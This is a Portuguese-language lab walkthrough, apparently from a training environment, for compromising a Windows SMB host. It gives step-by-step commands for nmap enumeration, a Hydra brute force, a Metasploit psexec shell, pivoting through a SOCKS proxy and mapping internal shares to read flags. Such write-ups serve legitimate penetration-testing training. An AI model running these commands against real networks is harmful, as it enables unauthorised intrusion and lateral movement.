## Exploração SMB + Pivoting (Windows)

Este lab segue **3 fases**:

1. Enumeração SMB (network-based)
2. Exploração com credenciais (network-based)
3. Pivoting e acesso interno (post-exploitation)

---

# Fase 1 — Reconhecimento

### 1. Verificar conectividade

ping -c 5 demo.ine.local  
ping -c 5 demo1.ine.local

Apenas `demo.ine.local` responde.

---

### 2. Scan inicial

nmap demo.ine.local

Portas típicas Windows abertas:

- 139 SMB
- 445 SMB
- RPC
- RDP

---

### 3. Identificar versão SMB

nmap -sV -p 139,445 demo.ine.local

Resultado:

- Windows Server 2008 R2 / 2012
- SMB ativo

---

### 4. Detectar versões SMB

nmap -p445 --script smb-protocols demo.ine.local

---

### 5. Segurança SMB

nmap -p445 --script smb-security-mode demo.ine.local

Identifica modo de autenticação.

---

# Fase 2 — Enumeração SMB

### 6. Testar Null Session

smbclient -L demo.ine.local

Pressione ENTER na senha.

Se listar shares → acesso anônimo permitido.

---

### 7. Enumerar usuários

nmap -p445 --script smb-enum-users demo.ine.local

Usuários encontrados:

admin  
administrator  
root  
guest

---

# Fase 3 — Brute Force SMB

### 8. Criar lista de usuários

nano users.txt

Conteúdo:

admin  
administrator  
root

---

### 9. Brute force com Hydra

hydra -L users.txt \  
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \  
demo.ine.local smb

Credenciais válidas obtidas.

---

# Fase 4 — Exploração com PsExec

### 10. Metasploit

msfconsole -q  
use exploit/windows/smb/psexec  
set RHOSTS demo.ine.local  
set SMBUser administrator  
set SMBPass password1  
exploit

Shell obtido:

meterpreter >

---

### 11. Informação do sistema

getuid  
sysinfo

Resultado:

NT AUTHORITY\SYSTEM

---

### 12. Ler FLAG1

cat C:\\Users\\Administrator\\Documents\\FLAG1.txt

---

# Fase 5 — Pivoting

### 13. Testar acesso ao segundo host

shell  
ping 10.0.28.125

Host interno acessível.

---

### 14. Adicionar rota

background  
run autoroute -s 10.0.28.0/20

---

### 15. Criar SOCKS proxy

use auxiliary/server/socks_proxy  
set SRVPORT 9050  
set VERSION 4a  
exploit

---

### 16. Scan via proxychains

proxychains nmap demo1.ine.local -sT -Pn -sV -p 445

Porta SMB aberta.

---

# Fase 6 — Acesso aos Shares

### 17. Enumerar shares

sessions -i 1  
shell  
net view 10.0.28.125

Se acesso negado:

migrate -N explorer.exe  
shell  
net view 10.0.28.125

Shares:

Documents  
K$

---

### 18. Mapear drives

net use D: \\10.0.28.125\Documents  
net use K: \\10.0.28.125\K$

---

### 19. Listar conteúdo

dir D:  
dir K:

---

### 20. Ler FLAG2

cat D:\\FLAG2.txt

---

# Fluxo resumido

Recon  
  ↓  
SMB enumeration  
  ↓  
Null session  
  ↓  
User enumeration  
  ↓  
Brute force  
  ↓  
PsExec exploit  
  ↓  
SYSTEM shell  
  ↓  
Pivoting  
  ↓  
SOCKS proxy  
  ↓  
Internal scan  
  ↓  
Share access  
  ↓  
FLAG2

---

# Classificação do ataque

|Fase|Tipo|
|---|---|
|SMB enum|Network-based|
|Hydra brute|Network-based|
|PsExec|Network-based|
|Pivoting|Post-exploitation|
|Share access|Lateral movement|